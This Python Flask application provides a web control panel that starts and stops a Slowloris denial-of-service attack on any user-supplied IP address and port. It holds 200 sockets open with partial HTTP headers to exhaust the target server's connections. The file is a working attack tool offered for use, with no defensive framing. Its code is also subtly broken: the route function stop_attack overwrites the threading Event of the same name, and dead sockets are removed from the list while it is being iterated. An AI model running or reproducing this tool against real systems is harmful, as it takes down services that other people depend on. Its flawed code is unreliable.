from flask import Flask, render_template, request, jsonify
import threading
import socket
import time

app = Flask(__name__)
stop_attack = threading.Event()

def slowloris_attack(ip, port):
    sockets = []
    try:
        for _ in range(200):  # Initialize multiple sockets
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.sendall(b"GET / HTTP/1.1\r\n")
            s.sendall(b"Host: " + ip.encode() + b"\r\n")
            s.sendall(b"Connection: keep-alive\r\n\r\n")
            sockets.append(s)

        while not stop_attack.is_set():
            for s in sockets:
                try:
                    s.sendall(b"X-a: keep-alive\r\n")
                except socket.error:
                    sockets.remove(s)  # Remove dead sockets
                    s.close()

            time.sleep(10)  # Slow down the requests
    except Exception as e:
        print(f"Error during attack: {e}")
    finally:
        for s in sockets:
            s.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_attack():
    global stop_attack
    stop_attack.clear()

    ip = request.json.get('ip')
    port = int(request.json.get('port', 80))

    if not ip or not port:
        return jsonify({'status': 'error', 'message': 'IP and port are required'})

    thread = threading.Thread(target=slowloris_attack, args=(ip, port))
    thread.daemon = True
    thread.start()
    return jsonify({'status': 'success', 'message': 'Attack started'})

@app.route('/stop', methods=['POST'])
def stop_attack():
    global stop_attack
    stop_attack.set()
    return jsonify({'status': 'success', 'message': 'Attack stopped'})

if __name__ == '__main__':
    app.run(debug=True)
